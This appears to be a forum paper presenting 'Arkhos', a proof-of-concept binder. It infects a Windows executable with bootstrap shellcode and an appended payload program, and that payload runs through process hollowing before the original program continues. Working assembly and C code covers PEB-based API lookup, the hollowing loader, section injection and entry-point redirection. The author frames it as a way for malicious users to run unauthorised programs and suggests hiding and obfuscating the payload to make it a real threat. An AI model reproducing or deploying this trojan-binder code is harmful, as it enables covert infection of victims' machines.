@@ -1,0 +1,393 @@
+Introduction
+It has been more than a year since I published the concept of infecting an executable with shellcode here 49 and recently I have been motivated to develop another PoC which follows the same path but at a more advanced level combining knowledge and techniques that I have learned since then. In this paper, I will be documenting a file “binding” method - I say “binding” because of how the idea was originally conceived - which, essentially, utilises a similar infection procedure as the previous paper. Dubbed Arkhos, this project was designed to achieve the PoC using accompanying shellcode given the title: Assimilative Infection using Diabolical Shellcode.
+
+Author Assigned Level: Wannabe
+Required Skills and Knowledge:
+C/C++ programming
+WinAPI
+Intel x86 assembly
+PE file format
+RunPE/Process Hollowing
+Disclaimer
+The following information provided was written purely through my own research and knowledge of Windows internals. If there is anything that needs to be corrected, please contact me and I will try to fix is as soon as possible. Any feedback or constructive criticism is also welcome.
+
+High-level Concept Overview
+The concept aims to merge one executable into another by infecting it with a piece of bootstrap shellcode and appending the payload executable. The entry point of the infected executable will be modified to point to the boostrap code which will first launch the payload as a new process using process hollowing and then jump to the original entry point to execute the original program.
+
+Here is a visual representation of a post-infection executable:
+
+High level concept                Infected executable
+overview of the result               PE file layout
+of the Arkhos project.          +----------------------+
+                                |                      |
+                                |        headers       |
+                                |                      |
+                                +----------------------+ <----+
+                                |                      |      |
+                                |        .text         |      |
+                                |                      |      |
+                                +----------------------+      | Jumps to
+                                |                      |      | the original
+                                |    other sections    |      | entry point
+                                |                      |      | and continues
+              New ------------> +----------------------+      | normal execution
+              entry point       |                      |      |
+                                |       bootstrap      |      |
+     Process hollowing  +------ |       shellcode      |      |
+     starts payload as  |       |                      | -----+
+     a new process      +-----> +----------------------+
+                                |                      |
+                                |        payload       |
+                                |       executable     |
+                                |                      |
+                                +----------------------+
+
+Ideally, the bootstrap shellcode will fit into the .text section’s code cave(s) however, due to its potential size, it may be too big and can be appended as a new section.
+
+The Shellcode
+Important Issues
+Before we can start the development of the shellcode, there are some important issues to which we must attend. The main concern is the position independence of the code. If the shellcode is reliant on hardcoded addresses, it will not be able to function successfully due to the differing environment of another executable. Because of this, we cannot rely on an import table to call WinAPI functions and we have to solve the issue of strings should we require them.
+
+Dynamically Retrieving WinAPI Functions
+Because of the way Windows works with executables, two DLLs are always present in memory: kernel32.dll and ntdll.dll. It is possible to take advantage of this information because we can use it to obtain the addresses of any function provided by the WinAPI. Here, we will only limit the need for functions exported by these two DLLs because they are more than enough for our purposes.
+
+How do we do this? The most common way is to find the PEB of the running executable which can be found at fs:30h, then we can simply find and iterate the list of modules in the process, i.e. we can find the base addresses of kernel32.dll and ntdll.dll. From there, we simply parse the module’s file like any other PE file and iterate the exported functions table until we get a match. For a more detailed analysis, please refer to my other thread here 12. To put this theory to practice, here is code that can achieve this:
+
+; get kernel32 base address
+_get_kernel32:
+	mov		eax, [fs:0x30]
+	mov		eax, [eax + 0x0C]
+	mov		eax, [eax + 0x14]
+	mov		eax, [eax]
+	mov		eax, [eax]
+	mov		eax, [eax + 0x10]
+	ret
+FARPROC GetKernel32Function(LPCSTR szFuncName) {
+	HMODULE hKernel32Mod = get_kernel32();
+
+	// get DOS header
+	PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)(hKernel32Mod);
+	// get NT headers
+	PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD)hKernel32Mod + pidh->e_lfanew);
+	// find eat
+	PIMAGE_EXPORT_DIRECTORY pied = (PIMAGE_EXPORT_DIRECTORY)((DWORD)hKernel32Mod + pinh->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+
+	// find export table functions
+	LPDWORD dwAddresses = (LPDWORD)((DWORD)hKernel32Mod + pied->AddressOfFunctions);
+	LPDWORD dwNames = (LPDWORD)((DWORD)hKernel32Mod + pied->AddressOfNames);
+	LPWORD wOrdinals = (LPWORD)((DWORD)hKernel32Mod + pied->AddressOfNameOrdinals);
+
+	// loop through all names of functions
+	for (int i = 0; i < pied->NumberOfNames; i++) {
+		LPSTR lpName = (LPSTR)((DWORD)hKernel32Mod + dwNames[i]);
+		if (!strcmp(szFuncName, lpName))
+			return (FARPROC)((DWORD)hKernel32Mod + dwAddresses[wOrdinals[i]]);
+	}
+
+	return NULL;
+}
+Dynamically Calculating String Addresses
+The other issue we must deal with is the addresses of strings. Since they are referenced with hardcoded addresses, one way we can find them at run-time is to use the delta offset trick to dynamically calculate the address of the string. Here is what it looks like in code:
+
+string:  db "Hello world!", 0
+
+_get_loc:
+    call _loc
+
+_loc:
+    pop edx
+    ret
+
+_get_string:
+    call _get_loc              ; get address of _loc
+    sub edx, _loc - string     ; calculate address of string by subtracting
+                               ; the difference in bytes from _loc
+    mov eax, edx               ; return the address of the string
+    ret
+Other Sources of Dependency
+There may be dependency elsewhere which can arise, such as the need for basic functions such as strlen, so manually writing those functions is also a necessity. To prevent any other form of dependencies from showing up during compilation of the executable, I opted to use C and assembly by compiling to object code with gcc and nasm and then manually linking with ld. It is also noteworthy to know that function calls can either be relative or absolute. To be relative (position independent), they must use the E8 hex opcode.
+
+Developing the Shellcode
+To begin, I will cover the code for the shellcode because it is required as a component in the binder program. The shellcode has two objectives: run the payload as a new process and then continue normal execution of the original program.
+
+Locate the payload which will be at the last section
+Create a suspended process
+Hollow the process starting from the payload’s image base up to the size of the image
+Allocate memory for the payload, parse and write the payload it correctly to the appropriate addresses
+Resume the process to start the execution of the payload
+Jump to the original entry point of the original program
+Locating the Payload
+Let’s have a look at how we can find the bytes of the last section of an executable:
+
+LPVOID GetPayload(LPVOID lpModule) {
+	// get DOS header
+	PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)lpModule;
+	// get NT headers
+	PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD)lpModule + pidh->e_lfanew);
+
+	// find .text section
+	PIMAGE_SECTION_HEADER pishText = IMAGE_FIRST_SECTION(pinh);
+	// get last IMAGE_SECTION_HEADER
+	PIMAGE_SECTION_HEADER pishLast = (PIMAGE_SECTION_HEADER)(pishText + (pinh->FileHeader.NumberOfSections - 1));
+
+	return (LPVOID)(pinh->OptionalHeader.ImageBase + pishLast->VirtualAddress);
+}
+The GetPayload function’s job is simple. It will get a pointer to the base address of the executable module in memory and then parse the PE headers from which we can obtain the necessary information to locate the sections. The first section can be found by calculating the offsets provided by the NT header using the IMAGE_FIRST_SECTION macro defined like so:
+
+#define IMAGE_FIRST_SECTION( ntheader ) ((PIMAGE_SECTION_HEADER)        \
+    ((ULONG_PTR)(ntheader) +                                            \
+     FIELD_OFFSET( IMAGE_NT_HEADERS, OptionalHeader ) +                 \
+     ((ntheader))->FileHeader.SizeOfOptionalHeader   \
+    ))
+Using the address of the first section header, we can locate the last section’s header by calculating the offset using the number of sections, similar to using an arbitrary access with arrays. Once we have the last section header, we can find its relative virtual address using the VirtualAddress member (remember that we are dealing with the executable in memory, not as a raw file) and then adding the ImageBase to get the absolute virtual address.
+
+RunPE/Process Hollowing
+The next stage requires the emulation of the Windows image loader in order to load the payload into a new process’s virtual memory. First, a process is needed so that there is somewhere into which we can write which can be created using CreateProcess, specifying the CREATE_SUSPENDED flag so that we can swap out the process’s executable module with the payload’s.
+
+	// process info
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+	MyMemset(&pi, 0, sizeof(pi));
+	MyMemset(&si, 0, sizeof(si));
+	si.cb = sizeof(si);
+	si.dwFlags = STARTF_USESHOWWINDOW;
+	si.wShowWindow = SW_SHOW;
+
+	// first create process as suspended
+	pfnCreateProcessA fnCreateProcessA = (pfnCreateProcessA)GetKernel32Function(0xA851D916);
+	fnCreateProcessA(szFileName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | DETACHED_PROCESS, NULL, NULL, &si, &pi);
+The file that will be used to create the new process will be the original program’s. Here is what the current state of the new process looks like (assuming the original program and the payload use the same base address):
+
+Visual representation               Original program
+of the new process              +----------------------+
+                                |        headers       |
+                                +----------------------+
+                                |        .text         |
+                                +----------------------+
+                                |        other         |
+                                |       sections       |
+                                +----------------------+
+                                |       shellcode      |
+                                +----------------------+
+                                |        payload       |
+                                +----------------------+
+It is important to note that we may want to also use the DETACHED_PROCESS flag so that the created process is not a child process meaning that if the original executable’s process terminates, it will not also terminate the payload’s process. The wShowWindow member can be modified to SW_HIDE to hide the window of the payload’s process but I have used SW_SHOW to show the successful result of the payload’s process execution.
+
+To be able to write the payload into the process, we need to unmap any allocated memory that is being used with ZwUnmapViewOfSection function, passing the base address from which to unmap.
+
+	// unmap memory space for our process
+	pfnGetProcAddress fnGetProcAddress = (pfnGetProcAddress)GetKernel32Function(0xC97C1FFF);
+	pfnGetModuleHandleA fnGetModuleHandleA = (pfnGetModuleHandleA)GetKernel32Function(0xB1866570);
+	pfnZwUnmapViewOfSection fnZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)fnGetProcAddress(fnGetModuleHandleA(get_ntdll_string()), get_zwunmapviewofsection_string());
+	fnZwUnmapViewOfSection(pi.hProcess, (LPVOID)pinh->OptionalHeader.ImageBase);
+Visual representation        __ Empty, unallocated memory
+of the new process         /    +----------------------+
+                          /     |                      |
+                        _/      |                      |
+          Address space         |                      |
+          is hollowed out       |                      |
+                        -       |                      |
+                          \     |                      |
+                           \___ +----------------------+
+Now we can parse and write the payload’s PE file into the process’s memory by first allocating memory at the ImageBase sized SizeOfImage and then using WriteProcessMemory to write the bytes into the virtual address space.
+
+    // allocate virtual space for process
+	pfnVirtualAllocEx fnVirtualAllocEx = (pfnVirtualAllocEx)GetKernel32Function(0xE62E824D);
+	LPVOID lpAddress = fnVirtualAllocEx(pi.hProcess, (LPVOID)pinh->OptionalHeader.ImageBase, pinh->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+	// write headers into memory
+	pfnWriteProcessMemory fnWriteProcessMemory = (pfnWriteProcessMemory)GetKernel32Function(0x4F58972E);
+	fnWriteProcessMemory(pi.hProcess, (LPVOID)pinh->OptionalHeader.ImageBase, lpPayload, pinh->OptionalHeader.SizeOfHeaders, NULL);
+
+	// write each section into memory
+	for (int i = 0; i < pinh->FileHeader.NumberOfSections; i++) {
+		// calculate section header of each section
+		PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)((DWORD)lpPayload + pidh->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * i);
+		// write section data into memory
+		fnWriteProcessMemory(pi.hProcess, (LPVOID)(pinh->OptionalHeader.ImageBase + pish->VirtualAddress), (LPVOID)((DWORD)lpPayload + pish->PointerToRawData), pish->SizeOfRawData, NULL);
+	}
+Visual representation               Payload program
+of the new process              +----------------------+
+       Copy headers ----------> |       headers        |
+                                +----------------------+
+       Copy each section -----> |        .text         |
+       manually into their      +----------------------+
+       correct virtual -------> |        other         |
+       offsets                  |       sections       |
+                                +----------------------+
+Before resuming the process, the thread’s context needs to be modified so that the instruction pointer starts at the AddressOfEntryPoint. Once that is done, the payload’s process can be safely started.
+
+	CONTEXT ctx;
+	ctx.ContextFlags = CONTEXT_FULL;
+	pfnGetThreadContext fnGetThreadContext = (pfnGetThreadContext)GetKernel32Function(0x649EB9C1);
+	fnGetThreadContext(pi.hThread, &ctx);
+
+	// set starting address at virtual address: address of entry point
+	ctx.Eax = pinh->OptionalHeader.ImageBase + pinh->OptionalHeader.AddressOfEntryPoint;
+	pfnSetThreadContext fnSetThreadContext = (pfnSetThreadContext)GetKernel32Function(0x5688CBD8);
+	fnSetThreadContext(pi.hThread, &ctx);
+
+	// resume our suspended processes
+	pfnResumeThread fnResumeThread = (pfnResumeThread)GetKernel32Function(0x3872BEB9);
+	fnResumeThread(pi.hThread);
+Finally we need to execute the original program. Simply:
+
+	void(*oep)() = (void *)0x69696969;
+	oep();
+I’ve put 0x69696969 there as a placeholder for the original entry point which will be modified with the binder program.
+
+Developing the Binder
+The binder’s job is relatively simple, involving some file I/O and minimal PE file manipulation.
+
+Read the target executable
+Read the payload executable
+Inject the shellcode into the appropriate section
+Append the payload’s bytes into a new section
+Write out the conjoined executable
+Extracting the shellcode
+After compiling the shellcode executable, it should have an empty import table and no data in any data sections. Everything that is needed should be in the .text section so extracting those bytes and then placing them into the binder’s source code should be a simple task.
+
+this->shellcode = std::vector<BYTE>{ 0x50, 0x41, 0x59, 0x4C, ... };
+The Binding Procedure
+Since file I/O is a trivial matter, I will leave those code segments out and immediately discuss the procedure to bind the two programs. There are two situations that decide where the shellcode will be placed: if the .text section has a large enough code cave, it will be inserted there else, it will be appended as a new section. Since I have yet to demonstrate how to create a new section to append data and to keep this paper short, I will only show this method. The other half will be present in the provided source code.
+
+Before appending the new section header, we need to check if there is enough space for the header. Finding this is just subtracting the raw address of the first section and the raw address of the end of the last section, then checking if it’s equal to or greater than the size of a section header. If there is not enough space then the file cannot be bound with a trivial approach. Creating a new section is relatively straightforward with understanding of the characteristics parameters and the alignment of values for the members which describe the data in the corresponding section. Once the section is created, it can be copied into the new section header space and the values in the File Header and Optional Header must be updated to reflect the changes.
+
+    // check code cave size in .text section
+	if (pishText->SizeOfRawData - pishText->Misc.VirtualSize >= this->shellcode.size()) {
+        // insert shellcode into .text section
+	} else {
+		// else create new executable section
+		// check space for new section header
+		// get last IMAGE_SECTION_HEADER
+		PIMAGE_SECTION_HEADER pishLast = (PIMAGE_SECTION_HEADER)(pishText + (pinh->FileHeader.NumberOfSections - 1));
+		PIMAGE_SECTION_HEADER pishNew = (PIMAGE_SECTION_HEADER)((DWORD)pishLast + IMAGE_SIZEOF_SECTION_HEADER);
+		if (pishText->PointerToRawData - (DWORD)pishNew < IMAGE_SIZEOF_SECTION_HEADER)
+			return false;
+
+		// create new section header
+		IMAGE_SECTION_HEADER ishNew;
+		::ZeroMemory(&ishNew, sizeof(ishNew));
+		::CopyMemory(ishNew.Name, ".aids", 5);
+		ishNew.Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;
+		ishNew.SizeOfRawData = ALIGN(this->shellcode.size(), pinh->OptionalHeader.FileAlignment);
+		ishNew.VirtualAddress = ALIGN((pishLast->VirtualAddress + pishLast->Misc.VirtualSize), pinh->OptionalHeader.SectionAlignment);
+		ishNew.PointerToRawData = ALIGN((pishLast->PointerToRawData + pishLast->SizeOfRawData), pinh->OptionalHeader.FileAlignment);
+		ishNew.Misc.VirtualSize = this->shellcode.size();
+
+		// fix headers' values
+		pinh->FileHeader.NumberOfSections++;
+		pinh->OptionalHeader.SizeOfImage = ALIGN((pinh->OptionalHeader.SizeOfImage + ishNew.Misc.VirtualSize), pinh->OptionalHeader.SectionAlignment);
+		// manually calculate size of headers; unreliable
+		pinh->OptionalHeader.SizeOfHeaders = ALIGN((pinh->FileHeader.NumberOfSections * IMAGE_SIZEOF_SECTION_HEADER), pinh->OptionalHeader.FileAlignment);
+
+		// append new section header
+		::CopyMemory(pishNew, &ishNew, IMAGE_SIZEOF_SECTION_HEADER);
+		// append new section and copy to output
+		output.insert(output.end(), target.begin(), target.end());
+		output.insert(output.end(), this->shellcode.begin(), this->shellcode.end());
+             Before                      After
+    +----------------------+    +----------------------+      Updated number of 
+    |        headers       |    |        headers       | <--- sections, size of
+    +----------------------+    +----------------------+      image and added new
+    |        .text         |    |        .text         |      shellcode section
+    +----------------------+    +----------------------+      header
+    |        other         |    |        other         |
+    |       sections       |    |       sections       |
+    +----------------------+    +----------------------+
+                                |       shellcode      | <--- Appended shellcode data
+                                +----------------------+
+Adding the payload section is essentially the same procedure but for completeness, I will present the code:
+
+		// append new payload section
+		// check space for new section header
+		// get DOS header
+		pidh = (PIMAGE_DOS_HEADER)output.data();
+		// get NT headers
+		pinh = (PIMAGE_NT_HEADERS)((DWORD)output.data() + pidh->e_lfanew);
+
+		// find .text section
+		pishText = IMAGE_FIRST_SECTION(pinh);
+		// get last IMAGE_SECTION_HEADER
+		pishLast = (PIMAGE_SECTION_HEADER)(pishText + (pinh->FileHeader.NumberOfSections - 1));
+		pishNew = (PIMAGE_SECTION_HEADER)((DWORD)pishLast + IMAGE_SIZEOF_SECTION_HEADER);
+		if (pishText->PointerToRawData - (DWORD)pishNew < IMAGE_SIZEOF_SECTION_HEADER)
+			return false;
+
+		// create new section header
+		::ZeroMemory(&ishNew, sizeof(ishNew));
+		::CopyMemory(ishNew.Name, ".payload", 8);
+		ishNew.Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_INITIALIZED_DATA;
+		ishNew.SizeOfRawData = ALIGN(payload.size(), pinh->OptionalHeader.FileAlignment);
+		ishNew.VirtualAddress = ALIGN((pishLast->VirtualAddress + pishLast->Misc.VirtualSize), pinh->OptionalHeader.SectionAlignment);
+		ishNew.PointerToRawData = ALIGN((pishLast->PointerToRawData + pishLast->SizeOfRawData), pinh->OptionalHeader.FileAlignment);
+		ishNew.Misc.VirtualSize = payload.size();
+
+		// fix headers' values
+		pinh->FileHeader.NumberOfSections++;
+		pinh->OptionalHeader.SizeOfImage = ALIGN((pinh->OptionalHeader.SizeOfImage + ishNew.Misc.VirtualSize), pinh->OptionalHeader.SectionAlignment);
+		pinh->OptionalHeader.SizeOfHeaders = ALIGN((pinh->OptionalHeader.SizeOfHeaders + IMAGE_SIZEOF_SECTION_HEADER), pinh->OptionalHeader.FileAlignment);
+
+		// append new section header
+		::CopyMemory(pishNew, &ishNew, IMAGE_SIZEOF_SECTION_HEADER);
+		// append new section and copy to output
+		output.insert(output.end(), payload.begin(), payload.end());
+             Before                      After
+    +----------------------+    +----------------------+      Updated number of 
+    |        headers       |    |        headers       | <--- sections, size of
+    +----------------------+    +----------------------+      image and added new
+    |        .text         |    |        .text         |      payload section
+    +----------------------+    +----------------------+      header
+    |        other         |    |        other         |
+    |       sections       |    |       sections       |
+    +----------------------+    +----------------------+
+    |       shellcode      |    |       shellcode      |
+    +----------------------+    +----------------------+
+                                |        payload       | <--- Appended payload data
+                                +----------------------+
+
+The final step is to update the address of entry point in the Optional Header and replace the placeholder original entry point in the shellcode.
+
+		// update address of entry point
+		// redefine headers
+		// get DOS header
+		pidh = (PIMAGE_DOS_HEADER)output.data();
+		// get NT headers
+		pinh = (PIMAGE_NT_HEADERS)((DWORD)output.data() + pidh->e_lfanew);
+		// find .text section
+		pishText = IMAGE_FIRST_SECTION(pinh);
+		// get .aids section (now is 2nd last)
+		pishLast = (PIMAGE_SECTION_HEADER)(pishText + (pinh->FileHeader.NumberOfSections - 2));
+		PIMAGE_SECTION_HEADER pishAids = pishLast;
+
+		// calculate new entry point
+		DWORD dwNewEntryPoint = pishAids->VirtualAddress + SHELLCODE_START_OFFSET;
+		pinh->OptionalHeader.AddressOfEntryPoint = dwNewEntryPoint;
+
+		// update OEP in shellcode
+		::CopyMemory(output.data() + pishAids->PointerToRawData + SHELLCODE_START_OFFSET + SHELLCODE_OEP_OFFSET, &dwOEP, sizeof(dwOEP));
+Demonstration
+Here I’ll present a quick demonstration of the resulting bound executable using PEview.exe as the target file and putty.exe as the payload.
+
+Execution
+
+
+Examining the Sections
+.aids section
+
+
+.payload section
+
+
+Conclusions
+From the basis of simple shellcode injection to infect an executable to show a message box, it is possible to extend the method further to achieve something far more sophisticated such as that of spawning an entirely separate executable. All that is expected is the some knowledge of the PE file, basic shellcoding and some Windows internals and the possibilities are (almost) limitless.
+
+Improvements
+Arkhos is purely a PoC used to suggest a method with which malicious users may utilise to execute unauthorised programs on a victim’s machine. Improvements may be made to make this a real threat such as hiding the payload’s window and also obfuscating the payload’s bytes through compression and/or encryption. As it stands now, the resultant executable from the demonstration has a significant detection rate which can be viewed on VirusTotal 119.
+
+The source codes and binaries will be uploaded onto my GitLab 281.
+
+Hopefully some of you have benefited from reading this paper in either an inspiring or an educative manner. Thanks for reading!
+
+– dtm
+
